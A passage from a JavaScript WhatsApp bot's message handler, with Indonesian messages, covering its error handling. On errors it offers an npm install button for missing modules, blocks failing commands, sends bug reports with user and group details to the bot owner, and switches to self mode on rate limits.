setReply( `Hai ${ucapanWaktu} kak *${pushname}*  ada yang bisa aku bantu ? silakan ketik ${prefix}menu`)
user.pc = new Date * 1
}
 



  





} catch (err){
Log(err)
//add to dashboard
if(isCmd) _data.Failed(toFirstCase(command), dash)
let e = util.format(err)
if(err.message.includes("Cannot find module")){
let module = err.message.split("Cannot find module '")[1].split("'")[0]
let teks = `Module ${module} belom di install
silakan klik tombol install di bawah terlebih dahulu`
let mok = [{"buttonId": `${prefix}exec npm i ${module}`,"buttonText": {"displayText": `Install`},"type": "RESPONSE"},
          {"buttonId": `${prefix}report module ${module} belom di install`,"buttonText": {"displayText": `Report`},"type": "RESPONSE"}]
let nono = {
  text: teks,
  footer: `${copyright}\n${calender}`,
  buttons: mok,
  headerType: 1
  }
  
  return await conn.sendMessage(m.key.remoteJid, nono , {quoted: m})
}
await setReply(`]─────「 *SYSTEM-ERROR* 」─────[\n\n${e}\n\n© ${fake1}`) 
if(_error.check(err.message, db.data.listerror)) return
_error.add(err.message, command, db.data.listerror)
if(autoblockcmd){        
_blockcmd.add(command,listcmdblock) 
await setReply("Command telah di block karena terjadi error")
} 
  
if(autoReport){
if(isQuotedImage){
var media =  "Reply Image ✅"
}else if(isQuotedVideo){
var media = "Reply Video ✅"
} else if(isQuotedSticker){ 
var media = "Reply Sticker ✅"
} else if(isQuotedAudio){
var media = "Reply Audio ✅"
} else if(isQuotedTeks){
var media =  "Reply Teks ✅"
} else if(isQuotedTag){
var media =  "Reply Tag ✅"
} else {
var media = "No Quoted ❌"
}

if(q.length > "0"){
var tetek = q
} else if(q.length == "0"){
var tetek = "No Query ❌"
}

if (isGroup && isBotGroupAdmins) {
let linkgc = await conn.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(isGroup && !isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} else if(!isGroup){
var yeh = `Botz Is Not In The Group`
} 

let teks =`\n*]───── 「 Laporan Bug ⚠️」 ─────[*\n\n👤 Nama : ${pushname}\n📳 Nomer : wa.me/${senderNumber}\n📢 Info Laporan :\n       _${e}_\n🔖 Command : ${prefix}${command}\n⏰Time : ${timeWib} Wib\n📝 Query : ${tetek}\n🧩 Quoted : ${media}\n💠 Group : ${isGroup?`${groupName}`:'Di private chat'}\n🆔 ID : ${from}\n🌐 Link Group : ${yeh}\n\n\n`
let mok = [{"buttonId": `${prefix}banuser ${sender}`,"buttonText": {"displayText": `ʙᴀɴɴᴇᴅ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}thanksuser ${sender}`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}]
let tolol = {
text: teks,
footer: `${copyright}\n${calender}`,
buttons: mok,
headerType: 1
}

await conn.sendMessage(Ownerin, tolol , {quoted: fkontak})

if(!autoblockcmd){
await conn.sendMessage(from,{ text: "Laporan error telah dikirim ke Developer Botz"})
}

if(isQuotedSticker || isQuotedImage || isQuotedVideo || isQuotedAudio ){
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await conn.sendMedia (Ownerin, media, m, {caption: "System Error"})
await fs.unlinkSync(media)
}

} 
}		







} catch(err){
Log(err)
console.log(chalk.bgRed(chalk.black("[  ERROR  ]")),util.format(err))
let e = String(err) 
if (e.includes("this.isZero")) {return}
if (e.includes("rate-overlimit")) {
if(!publik) return
publik = false
await conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Terjadi rate-overlimit
Bot telah mengganti dari mode Public ke mode Self
Untuk menghindari spam yang berlebihan,
Silakan tunggu 1 menit hingga semua pesan
telah terbaca oleh bot`
})
await setTimeout(() => {
publik = true
 conn.sendMessage(nomerOwner+"@s.whatsapp.net",{ 
text: `Berhasil mengubah mode self ke mode public`
})
}, 60000)
return
}
if (e.includes('Connection Closed')){ return }
if (e.includes('Timed Out')){ return }
if (e.includes('Value not found')){ return }
console.log(chalk.white('Message Error : %s'), chalk.green(util.format(e)))
}



  

}//Akhir export default







const __filename = new URL('', import.meta.url).pathname
//const __dirname = new URL('.', import.meta.url).pathname
let file = fileURLToPath(import.meta.url)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.bgGreen(chalk.black("[  UPDATE ]")),chalk.white(`${__filename}`) )
delRequireCache(file)
delete require.cache[file]
import(`${file}?update=${Date.now()}`)
})
